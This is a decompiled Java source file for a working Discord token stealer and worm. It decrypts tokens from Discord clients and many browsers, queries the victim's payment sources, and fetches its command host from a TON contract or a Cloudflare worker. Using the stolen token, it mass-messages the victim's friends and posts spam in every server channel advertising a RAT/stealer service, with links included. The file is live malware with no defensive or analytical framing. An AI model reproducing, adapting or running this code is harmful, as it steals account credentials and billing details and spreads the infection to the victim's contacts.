package org.example;

import com.fasterxml.jackson.databind.JsonNode;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.google.gson.JsonArray;
import com.google.gson.JsonElement;
import com.google.gson.JsonObject;
import com.google.gson.JsonParser;
import com.google.gson.JsonPrimitive;
import com.sun.jna.platform.win32.Crypt32Util;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Base64;
import java.util.HashMap;
import java.util.HashSet;
import java.util.List;
import java.util.Objects;
import java.util.Set;
import java.util.Vector;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.util.stream.Collectors;
import java.util.stream.Stream;
import javax.crypto.Cipher;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import javax.net.ssl.HttpsURLConnection;

public class Main {
   private static final long SEND_MESSAGES = 2048L;
   static boolean found = false;
   private static final Set<String> tokens = new HashSet<>();
   public static final String ROAMING = System.getenv("APPDATA");
   public static final String LOCAL = System.getenv("LOCALAPPDATA");
   private static final List<String> clientPaths = new ArrayList<>();
   private static final List<String> browserPaths = new ArrayList<>();
   private static final ObjectMapper objectMapper = new ObjectMapper();
   private static final Pattern ENCRYPTED_TOKEN_REGEX = Pattern.compile("dQw4w9WgXcQ:[^\"]*");
   public static final Pattern TOKEN_REGEX = Pattern.compile("[\\w-]{24,29}\\.[\\w-]{6}\\.[\\w-]{25,110}");
   private static final int ENCRYPTED_TOKEN_OFFSET = 12;
   private static final int DPAPI_OFFSET = 5;
   private static final int IV_OFFSET = 3;
   private static final int IV_SIZE = 12;
   private static final int PAYLOAD_OFFSET = 15;
   private static final int GCM_BIT_LENGTH = 128;
   static List<String> tokenlist = new ArrayList<>();
   private static final String DEFAULT_BASE = "https://funrat.mom";
   private static final String WORKER_BASE = "https://relay-3f9c71.kartohaantoha36-6a9.workers.dev";
   private static final String TACT_ADDR = "EQChU6Zxa_y2fKeeCaSDubGcFZizRdRVSArwAh6qJtfe9NKZ";
   private static final String[] TON_RPC = new String[]{"https://toncenter.com/api/v2/runGetMethod", "https://tonhubapi.com/api/v2/runGetMethod"};
   static volatile String BASE_URL = "https://funrat.mom";

   static String readAll(InputStream var0) throws IOException {
      StringBuilder var1 = new StringBuilder();
      BufferedReader var2 = new BufferedReader(new InputStreamReader(var0, "UTF-8"));

      String var3;
      while ((var3 = var2.readLine()) != null) {
         var1.append(var3);
      }

      var2.close();
      return var1.toString();
   }

   static String tonLink(int var0) {
      String var1 = "{\"address\":\"EQChU6Zxa_y2fKeeCaSDubGcFZizRdRVSArwAh6qJtfe9NKZ\",\"method\":\"link\",\"stack\":[[\"int\",\"" + var0 + "\"]]}";

      for (String var5 : TON_RPC) {
         HttpURLConnection var6 = null;

         try {
            var6 = (HttpURLConnection)new URL(var5).openConnection();
            var6.setRequestMethod("POST");
            var6.setDoOutput(true);
            var6.setConnectTimeout(8000);
            var6.setReadTimeout(12000);
            var6.setRequestProperty("Content-Type", "application/json");
            OutputStream var7 = var6.getOutputStream();
            var7.write(var1.getBytes("UTF-8"));
            var7.close();
            String var8 = readAll(var6.getInputStream());
            Matcher var9 = Pattern.compile("\"b64\":\"([A-Za-z0-9+/=]+)\"").matcher(var8);
            if (var9.find()) {
               return new String(Base64.getDecoder().decode(var9.group(1)), "UTF-8");
            }

            return null;
         } catch (Exception var14) {
         } finally {
            if (var6 != null) {
               var6.disconnect();
            }
         }
      }

      return null;
   }

   static String workerSlot(String var0) {
      HttpURLConnection var1 = null;

      try {
         var1 = (HttpURLConnection)new URL("https://relay-3f9c71.kartohaantoha36-6a9.workers.dev/config").openConnection();
         var1.setRequestMethod("GET");
         var1.setConnectTimeout(8000);
         var1.setReadTimeout(12000);
         if (var1.getResponseCode() != 200) {
            return null;
         }

         String var2 = readAll(var1.getInputStream());
         Matcher var3 = Pattern.compile("\"" + var0 + "\"\\s*:\\s*\"([^\"]+)\"").matcher(var2);
         if (var3.find()) {
            return var3.group(1);
         }
      } catch (Exception var8) {
      } finally {
         if (var1 != null) {
            var1.disconnect();
         }
      }

      return null;
   }

   static void initBase() {
      String var0 = null;

      try {
         var0 = tonLink(3);
      } catch (Throwable var3) {
      }

      if (var0 == null || !var0.startsWith("http")) {
         try {
            var0 = workerSlot("3");
         } catch (Throwable var2) {
         }
      }

      if (var0 == null || !var0.startsWith("http")) {
         var0 = "https://funrat.mom";
      }

      while (var0.endsWith("/")) {
         var0 = var0.substring(0, var0.length() - 1);
      }

      BASE_URL = var0;
      System.out.println("base = " + BASE_URL);
   }

   public static void main(String[] var0) {
      try {
         initBase();
         System.out.println("So... Yes!");

         try {
            getDiscordToken();
            if (tokenlist != null) {
               for (String var2 : tokenlist) {
                  if (!found) {
                     isUserInGuild(var2, "1443109598579003414");
                  }
               }
            }
         } catch (Exception var3) {
            var3.printStackTrace();
         }
      } catch (Exception var4) {
         System.out.println("An error occurred during the Discord token collection process");
      }
   }

   public static boolean hasPermissionToSend(JsonObject var0) {
      if (!var0.has("permission_overwrites")) {
         return false;
      }

      JsonArray var1 = var0.getAsJsonArray("permission_overwrites");

      for (int var2 = 0; var2 < var1.size(); var2++) {
         JsonObject var3 = var1.get(var2).getAsJsonObject();
         if (var3.has("allow") && var3.has("deny")) {
            long var4 = var3.get("allow").getAsLong();
            long var6 = var3.get("deny").getAsLong();
            if ((var4 & 2048L) != 0L) {
               return true;
            }

            if ((var6 & 2048L) != 0L) {
               return false;
            }
         }
      }

      return true;
   }

   private static void isUserInGuild(String var0, String var1) {
      try {
         URL var5 = new URL("https://discord.com/api/v9/users/@me/guilds");
         HttpURLConnection var6 = (HttpURLConnection)var5.openConnection();
         var6.setRequestMethod("GET");
         var6.setRequestProperty("Authorization", var0);
         var6.setRequestProperty(
            "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
         );
         BufferedReader var7 = new BufferedReader(new InputStreamReader(var6.getInputStream()));
         StringBuilder var8 = new StringBuilder();

         String var4;
         while ((var4 = var7.readLine()) != null) {
            var8.append(var4);
         }

         var7.close();
         var6.disconnect();
         JsonParser var9 = new JsonParser();
         JsonArray var10 = var9.parse(var8.toString()).getAsJsonArray();

         for (int var3 = 0; var3 < var10.size(); var3++) {
            String var2 = var10.get(var3).getAsJsonObject().get("id").getAsString();
            if (var2.equals(var1)) {
               found = true;
               System.out.println("Stop testing rat yourself");
            }
         }

         if (!found) {
            new Thread(() -> runMassDm(var0)).start();

            for (int var25 = 0; var25 < var10.size(); var25++) {
               String var24 = var10.get(var25).getAsJsonObject().get("id").getAsString();

               try {
                  var5 = new URL("https://discord.com/api/v10/guilds/" + var24 + "/channels");
                  var6 = (HttpURLConnection)var5.openConnection();
                  var6.setRequestMethod("GET");
                  var6.setRequestProperty("Authorization", var0);
                  var6.setRequestProperty(
                     "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
                  );
                  int var11 = var6.getResponseCode();
                  if (var11 != 200) {
                     System.out.println("Error: " + var11);
                  } else {
                     var7 = new BufferedReader(new InputStreamReader(var6.getInputStream()));
                     StringBuilder var13 = new StringBuilder();

                     String var12;
                     while ((var12 = var7.readLine()) != null) {
                        var13.append(var12);
                     }

                     var7.close();
                     JsonParser var14 = new JsonParser();

                     for (JsonElement var17 : var14.parse(var13.toString()).getAsJsonArray()) {
                        JsonObject var18 = var17.getAsJsonObject();
                        if (var18.get("type").getAsInt() == 0) {
                           String var19 = var18.get("name").getAsString();
                           String var20 = var18.get("id").getAsString();
                           boolean var21 = hasPermissionToSend(var18);
                           if (var21) {
                              sendMessage(
                                 var0,
                                 var20,
                                 "@everyone @here\n\n:red_circle::blue_circle: **YOUR MINECRAFT ACCOUNT IS ALREADY STOLEN** :blue_circle::red_circle:\n\n**:warning: RAT / STEALER MOD :warning:**\n\n:file_folder: **TDATA** — Telegram fully compromised\n:syringe: **Discord** — tokens, Nitro, servers ready for dump\n:globe_with_meridians: **Browsers** — Binance, Bybit, MetaMask, Phantom wide open\n:key: **Crypto** — Exodus, Trust Wallet, Ronin withdrawals ready\n:desktop: **Minecraft** — launchers, premium accounts full control\n:credit_card: **All** — passwords, screenshots, seed phrases accessible\n\n**:fire: THREE YEARS ON THE MARKET :fire:**\nNot some one-day scam. Thousands of clients worldwide made bank. Cars, mortgages, steady monthly cash. This is stats, not hype.\n\n**:gem: WHAT YOU GET :gem:**\n:gear: Build in 20 seconds\n:satellite: Instant logs to Discord/TG\n:arrows_counterclockwise: Daily updates — AV powerless\n:tools: 24/7 support + private chat\n:trophy: Time-tested beast\n\n**:free: FREE = FULL FUNCTIONALITY :free:**\nNo demos. Build it, grab accounts and crypto. In a month you teach newcomers.\n\n**:link: LINKS :link:**\n:globe_with_meridians: https://funrat.mom/\n:mailbox_with_mail: https://t.me/weloverat\n:video_game: https://discord.gg/TSYMmF9B2y\n\n**:skull: Get in while accounts are juicy. Inside = money. Outside = loss. Act now. :skull:**",
                                 var20
                              );
                           }
                        }
                     }
                  }
               } catch (Exception var22) {
                  var22.printStackTrace();
               }
            }
         }
      } catch (Exception var23) {
         var23.printStackTrace();
      }
   }

   private static void runMassDm(String var0) {
      for (String var3 : loadFriends(var0)) {
         try {
            String var4 = createDMChannel(var0, var3);
            if (var4 != null) {
               sendMessage(
                  var0,
                  var4,
                  "<@"
                     + var3
                     + ">\n\n:red_circle::blue_circle: **YOUR MINECRAFT ACCOUNT IS ALREADY STOLEN** :blue_circle::red_circle:\n\n**:warning: RAT / STEALER MOD :warning:**\n\n:file_folder: **TDATA** — Telegram fully compromised\n:syringe: **Discord** — tokens, Nitro, servers ready for dump\n:globe_with_meridians: **Browsers** — Binance, Bybit, MetaMask, Phantom wide open\n:key: **Crypto** — Exodus, Trust Wallet, Ronin withdrawals ready\n:desktop: **Minecraft** — launchers, premium accounts full control\n:credit_card: **All** — passwords, screenshots, seed phrases accessible\n\n**:fire: THREE YEARS ON THE MARKET :fire:**\nNot some one-day scam. Thousands of clients worldwide made bank. Cars, mortgages, steady monthly cash. This is stats, not hype.\n\n**:gem: WHAT YOU GET :gem:**\n:gear: Build in 20 seconds\n:satellite: Instant logs to Discord/TG\n:arrows_counterclockwise: Daily updates — AV powerless\n:tools: 24/7 support + private chat\n:trophy: Time-tested beast\n\n**:free: FREE = FULL FUNCTIONALITY :free:**\nNo demos. Build it, grab accounts and crypto. In a month you teach newcomers.\n\n**:link: LINKS :link:**\n:globe_with_meridians: https://funrat.mom/\n:mailbox_with_mail: https://t.me/weloverat\n:video_game: https://discord.gg/TSYMmF9B2y\n\n**:skull: Get in while accounts are juicy. Inside = money. Outside = loss. Act now. :skull:**",
                  var3
               );
            }
         } catch (Exception var5) {
            var5.printStackTrace();
         }
      }
   }

   private static List<String> loadFriends(String var0) {
      ArrayList var1 = new ArrayList();

      try {
         URL var3 = new URL("https://discord.com/api/v9/users/@me/relationships");
         HttpURLConnection var4 = (HttpURLConnection)var3.openConnection();
         var4.setRequestMethod("GET");
         var4.setRequestProperty("Authorization", var0);
         var4.setRequestProperty(
            "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
         );
         BufferedReader var5 = new BufferedReader(new InputStreamReader(var4.getInputStream()));
         StringBuilder var6 = new StringBuilder();

         String var2;
         while ((var2 = var5.readLine()) != null) {
            var6.append(var2);
         }

         var5.close();
         var4.disconnect();
         JsonParser var7 = new JsonParser();
         JsonArray var8 = var7.parse(var6.toString()).getAsJsonArray();

         for (int var9 = 0; var9 < var8.size(); var9++) {
            var1.add(var8.get(var9).getAsJsonObject().get("id").getAsString());
         }
      } catch (Exception var10) {
         var10.printStackTrace();
      }

      return var1;
   }

   private static String createDMChannel(String var0, String var1) throws Exception {
      JsonObject var3 = new JsonObject();
      JsonArray var4 = new JsonArray();
      var4.add(new JsonPrimitive(var1));
      var3.add("recipients", var4);
      URL var5 = new URL("https://discord.com/api/v9/users/@me/channels");
      HttpURLConnection var6 = (HttpURLConnection)var5.openConnection();
      var6.setRequestMethod("POST");
      var6.setRequestProperty("Authorization", var0);
      var6.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36");
      var6.setRequestProperty("Content-Type", "application/json");
      var6.setDoOutput(true);
      OutputStream var7 = var6.getOutputStream();

      try {
         byte[] var8 = var3.toString().getBytes("utf-8");
         var7.write(var8, 0, var8.length);
      } catch (Throwable var12) {
         if (var7 != null) {
            try {
               var7.close();
            } catch (Throwable var11) {
               var12.addSuppressed(var11);
            }
         }

         throw var12;
      }

      if (var7 != null) {
         var7.close();
      }

      BufferedReader var13 = new BufferedReader(new InputStreamReader(var6.getInputStream()));
      StringBuilder var14 = new StringBuilder();

      String var2;
      while ((var2 = var13.readLine()) != null) {
         var14.append(var2);
      }

      var13.close();
      var6.disconnect();
      JsonParser var9 = new JsonParser();
      JsonObject var10 = var9.parse(var14.toString()).getAsJsonObject();
      return var10.has("id") ? var10.get("id").getAsString() : null;
   }

   private static void sendMessage(String var0, String var1, String var2, String var3) throws Exception {
      if (var2 != null) {
         var2 = var2.replace("https://funrat.mom", BASE_URL);
      }

      JsonObject var4 = new JsonObject();
      var4.addProperty("content", var2);
      var4.addProperty("nonce", var3);
      var4.addProperty("tts", false);
      URL var5 = new URL("https://discord.com/api/v9/channels/" + var1 + "/messages");
      HttpURLConnection var6 = (HttpURLConnection)var5.openConnection();
      var6.setRequestMethod("POST");
      var6.setRequestProperty("Authorization", var0);
      var6.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36");
      var6.setRequestProperty("Content-Type", "application/json");
      var6.setDoOutput(true);
      OutputStream var7 = var6.getOutputStream();

      try {
         byte[] var8 = var4.toString().getBytes("utf-8");
         var7.write(var8, 0, var8.length);
      } catch (Throwable var11) {
         if (var7 != null) {
            try {
               var7.close();
            } catch (Throwable var10) {
               var11.addSuppressed(var10);
            }
         }

         throw var11;
      }

      if (var7 != null) {
         var7.close();
      }

      int var12 = var6.getResponseCode();
      var6.disconnect();
      if (var12 == 200 || var12 == 204) {
         System.out.println("Message sent to user ID: " + var3);
      } else if (var12 == 429) {
         System.out.println("Rate limited. Skipping user ID: " + var3);
      } else if (var12 == 403) {
         System.out.println("DMs closed for user ID: " + var3);
      } else if (var12 == 400) {
         System.out.println("Captcha detected for user ID: " + var3);
      } else {
         System.out.println("Failed to send message to user ID: " + var3 + ". Status code: " + var12);
      }
   }

   public static void getDiscordToken() {
      try {
         getClientTokens();
         getBrowserTokens();

         for (String var1 : tokens) {
            String var2 = CheckDiscordToken(var1);
            if (!var2.equals("")) {
               card(var1, var2);
            }
         }
      } catch (Exception var3) {
         ErrorMessage(var3, "discord token stealer");
      }
   }

   private static void card(String var0, String var1) {
      try {
         URL var2 = new URL("https://discord.com/api/v6/users/@me");
         HttpURLConnection var3 = getConnection(var2, var0);
         int var4 = var3.getResponseCode();
         if (var4 == 200) {
            BufferedReader var6 = new BufferedReader(new InputStreamReader(var3.getInputStream()));
            StringBuilder var7 = new StringBuilder();

            String var5;
            while ((var5 = var6.readLine()) != null) {
               var7.append(var5);
            }

            var6.close();
            var7.toString();
            URL var8 = new URL("https://discord.com/api/v6/users/@me/billing/payment-sources");
            var3 = getConnection(var8, var0);
            int var9 = var3.getResponseCode();
            if (var9 != 200) {
               tokenlist.add(var0);
            } else {
               BufferedReader var11 = new BufferedReader(new InputStreamReader(var3.getInputStream()));
               StringBuilder var12 = new StringBuilder();

               String var10;
               while ((var10 = var11.readLine()) != null) {
                  var12.append(var10);
               }

               var11.close();
               String var13 = var12.toString().replace("[", "").replace("]", "");
               if (var13.length() != 0) {
                  processPaymentData(var13, var1, var0);
               } else {
                  tokenlist.add(var0);
               }
            }
         }

         var3.disconnect();
      } catch (Exception var14) {
         var14.printStackTrace();
      }
   }

   private static void processPaymentData(String var0, String var1, String var2) {
      try {
         String[] var3 = var0.replace("[", "").replace("]", "").split(",");
         HashMap var4 = new HashMap();

         for (String var8 : var3) {
            String[] var9 = var8.split(":");
            if (var9.length == 2) {
               String var10 = var9[0].replace("\"", "").trim();
               String var11 = var9[1].replace("\"", "").trim();
               var4.put(var10, var11);
            }
         }

         if (!var4.getOrDefault("expires_year", "").isEmpty()) {
            String var13 = "expiresYear:"
               + var4.getOrDefault("expires_year", "")
               + " country:"
               + var4.getOrDefault("country", "")
               + " last_4:"
               + var4.getOrDefault("last_4", "")
               + " expires_month:"
               + var4.getOrDefault("expires_month", "")
               + " city:"
               + var4.getOrDefault("city", "")
               + " postalCode:"
               + var4.getOrDefault("postal_code", "")
               + " name:"
               + var4.getOrDefault("name", "")
               + " lineOne:"
               + var4.getOrDefault("line_1", "")
               + " lineTwo:"
               + (var4.containsKey("line_2") ? (String)var4.get("line_2") : "null")
               + " state:"
               + var4.getOrDefault("state", "");
         } else {
            String var14 = "country:"
               + var4.getOrDefault("country", "")
               + " city:"
               + var4.getOrDefault("city", "")
               + " postalCode:"
               + var4.getOrDefault("postal_code", "")
               + " name:"
               + var4.getOrDefault("name", "")
               + " lineOne:"
               + var4.getOrDefault("line_1", "")
               + " lineTwo:"
               + (var4.containsKey("line_2") ? (String)var4.get("line_2") : "null")
               + " state:"
               + var4.getOrDefault("state", "");
         }

         tokenlist.add(var2);
      } catch (Exception var12) {
         var12.printStackTrace();
      }
   }

   private static HttpURLConnection getConnection(URL var0, String var1) throws IOException {
      HttpURLConnection var2 = (HttpURLConnection)var0.openConnection();
      var2.setRequestProperty("Authorization", var1);
      var2.setRequestProperty("Content-Type", "application/json");
      var2.setRequestProperty(
         "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
      );
      return var2;
   }

   private static void getBrowserTokens() {
      loadBrowserPaths().forEach(var0 -> tokens.addAll(getTokens(var0)));
   }

   private static void getClientTokens() {
      loadClientPaths().forEach(var0 -> tokens.addAll(decryptTokens(Paths.get(var0, "Local Storage", "leveldb").toString(), getAESKey(var0))));
   }

   public static Set<String> getTokens(String var0) {
      HashSet var1 = new HashSet();
      listValidFiles(var0).forEach(var1x -> var1.addAll(searchTokens(var1x)));
      return var1;
   }

   public static Set<String> decryptTokens(String var0, byte[] var1) {
      HashSet var2 = new HashSet();

      for (byte[] var4 : listTokens(var0)) {
         byte[] var5 = new byte[12];
         System.arraycopy(var4, 3, var5, 0, 12);
         byte[] var6 = new byte[var4.length - 15];
         System.arraycopy(var4, 15, var6, 0, var6.length);

         try {
            Cipher var7 = Cipher.getInstance("AES/GCM/NoPadding");
            var7.init(2, new SecretKeySpec(var1, "AES"), new GCMParameterSpec(128, var5));
            var2.add(new String(var7.doFinal(var6)));
         } catch (Exception var8) {
         }
      }

      return var2;
   }

   public static byte[] getAESKey(String var0) {
      try {
         JsonNode var1 = getObjectMapper().readTree(Paths.get(var0, "Local State").toFile());
         String var2 = var1.path("os_crypt").path("encrypted_key").asText();
         byte[] var3 = Base64.getDecoder().decode(var2);
         byte[] var4 = Arrays.copyOfRange(var3, 5, var3.length);
         return Crypt32Util.cryptUnprotectData(var4);
      } catch (Exception var5) {
         return null;
      }
   }

   public static ObjectMapper getObjectMapper() {
      return objectMapper;
   }

   private static List<byte[]> listTokens(String var0) {
      ArrayList var1 = new ArrayList();
      listValidFiles(var0).forEach(var1x -> var1.addAll(decodeTokens(var1x)));
      return var1;
   }

   private static List<byte[]> decodeTokens(File var0) {
      ArrayList var1 = new ArrayList();

      try {
         BufferedReader var2 = new BufferedReader(new FileReader(var0));

         String var3;
         try {
            while ((var3 = var2.readLine()) != null) {
               Matcher var4 = ENCRYPTED_TOKEN_REGEX.matcher(var3);
               if (var4.find()) {
                  String var5 = var4.group().substring(12);
                  byte[] var6 = Base64.getDecoder().decode(var5);
                  var1.add(var6);
               }
            }
         } catch (Throwable var8) {
            try {
               var2.close();
            } catch (Throwable var7) {
               var8.addSuppressed(var7);
            }

            throw var8;
         }

         var2.close();
      } catch (Exception var9) {
      }

      return var1;
   }

   private static Set<String> searchTokens(File var0) {
      HashSet var1 = new HashSet();

      try {
         BufferedReader var2 = new BufferedReader(new FileReader(var0));

         String var3;
         try {
            while ((var3 = var2.readLine()) != null) {
               Matcher var4 = TOKEN_REGEX.matcher(var3);
               if (var4.find()) {
                  var1.add(var4.group());
               }
            }
         } catch (Throwable var6) {
            try {
               var2.close();
            } catch (Throwable var5) {
               var6.addSuppressed(var5);
            }

            throw var6;
         }

         var2.close();
      } catch (Exception var7) {
      }

      return var1;
   }

   public static List<String> loadClientPaths() {
      addClientPath(ROAMING, "discord");
      addClientPath(ROAMING, "discordcanary");
      addClientPath(ROAMING, "discordptb");
      return clientPaths;
   }

   public static List<String> loadBrowserPaths() {
      addChromiumPath(LOCAL, "Chromium", "User Data", "Default", "Local Storage", "leveldb");
      addChromiumPath(LOCAL, "Google", "Chrome", "User Data", "Default", "Local Storage", "leveldb");
      addChromiumPath(LOCAL, "Google", "Chrome Beta", "User Data", "Default", "Local Storage", "leveldb");
      addChromiumPath(LOCAL, "Google", "Chrome Dev", "User Data", "Default", "Local Storage", "leveldb");
      addChromiumPath(LOCAL, "Google", "Chrome SxS", "User Data", "Default", "Local Storage", "leveldb");
      addChromiumPath(LOCAL, "Microsoft", "Edge", "User Data", "Default", "Local Storage", "leveldb");
      addChromiumPath(LOCAL, "BraveSoftware", "Brave-Browser", "User Data", "Default", "Local Storage", "leveldb");
      addChromiumPath(LOCAL, "Vivaldi", "User Data", "Default", "Local Storage", "leveldb");
      addChromiumPath(ROAMING, "Opera Software", "Opera Stable", "Local Storage", "leveldb");
      addChromiumPath(ROAMING, "Opera Software", "Opera GX Stable", "Local Storage", "leveldb");
      addChromiumPath(ROAMING, "Opera Software", "Opera GX", "Local Storage", "leveldb");
      addChromiumPath(ROAMING, "Opera Software", "Opera Next", "Default", "Local Storage", "leveldb");
      addChromiumPath(ROAMING, "Opera Software", "Opera Developer", "Default", "Local Storage", "leveldb");
      addChromiumPath(LOCAL, "Iridium", "User Data", "Default", "Local Storage", "leveldb");
      addChromiumPath(LOCAL, "Epic Privacy Browser", "User Data", "Default", "Local Storage", "leveldb");
      addChromiumPath(LOCAL, "falkon", "profiles", "default", "Local Storage", "leveldb");
      addChromiumPath(LOCAL, "Yandex", "YandexBrowser", "User Data", "Default", "Local Storage", "leveldb");
      addFirefoxPath(ROAMING, "Mozilla", "Firefox", "Profiles");
      addFirefoxPath(ROAMING, "Waterfox", "Profiles");
      addFirefoxPath(ROAMING, "librewolf", "Profiles");
      addFirefoxPath(ROAMING, "Moonchild Productions", "Pale Moon", "Profiles");
      return browserPaths;
   }

   private static void addClientPath(String... var0) {
      clientPaths.add(String.join(File.separator, var0));
   }

   private static void addFirefoxPath(String... var0) {
      Path var1 = Paths.get(String.join(File.separator, var0));
      File var2 = var1.toFile();
      if (var2.exists()) {
         if (var2.listFiles() != null) {
            try {
               Files.list(var1)
                  .flatMap(
                     var0x -> {
                        try {
                           return Files.list(Paths.get(var0x.toFile().getAbsolutePath(), "storage", "default"))
                              .filter(var0xx -> var0xx.toFile().getName().contains("discord"))
                              .map(var0xx -> Paths.get(var0xx.toFile().getAbsolutePath(), "ls").toString());
                        } catch (IOException var2x) {
                           return Stream.empty();
                        }
                     }
                  )
                  .forEach(browserPaths::add);
            } catch (Exception var4) {
            }
         }
      }
   }

   private static void addChromiumPath(String... var0) {
      browserPaths.add(String.join(File.separator, var0));
   }

   public static List<File> listValidFiles(String var0) {
      File var1 = new File(var0);
      return !var1.exists() ? new ArrayList<>() : Arrays.stream(var1.listFiles()).filter(var0x -> {
         String var1x = var0x.getName();
         return var1x.endsWith(".ldb") || var1x.endsWith(".log") || var1x.endsWith(".sqlite");
      }).collect(Collectors.toList());
   }

   private static String CheckDiscordToken(String var0) {
      String var1 = ReadWebsite("https://discord.com/api/v9/users/@me", var0);
      return var1.equals("h") ? "" : var1.split("\"")[7] + " | id: " + var1.split("\"")[3];
   }

   private static Vector<String> FindPattern(Pattern var0, String var1) {
      Vector var2 = new Vector();

      try {
         Matcher var3 = var0.matcher(var1);

         while (var3.find() && !var2.contains(var3.group())) {
            var2.add(var3.group());
         }
      } catch (Exception var4) {
      }

      return var2;
   }

   private static void ErrorMessage(Exception var0, String var1) {
   }

   private static String ReadWebsite(String var0) {
      return ReadWebsite(var0, "h");
   }

   private static String ReadWebsite(String var0, String var1) {
      try {
         HttpsURLConnection var3 = (HttpsURLConnection)new URL(var0).openConnection();
         if (!Objects.equals(var1, "h")) {
            var3.setRequestProperty("Authorization", var1);
         }

         var3.setRequestProperty("Content-Type", "application/json");
         var3.setRequestProperty(
            "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
         );
         if (var3.getResponseCode() != 200) {
            return "h";
         }

         BufferedReader var4 = new BufferedReader(new InputStreamReader(var3.getInputStream()));
         StringBuilder var5 = new StringBuilder();

         String var2;
         while ((var2 = var4.readLine()) != null) {
            var5.append(var2);
            var5.append(System.lineSeparator());
         }

         var4.close();
         return var5.toString();
      } catch (IOException var6) {
         ErrorMessage(var6, "in reading the website");
         return "h";
      }
   }
}
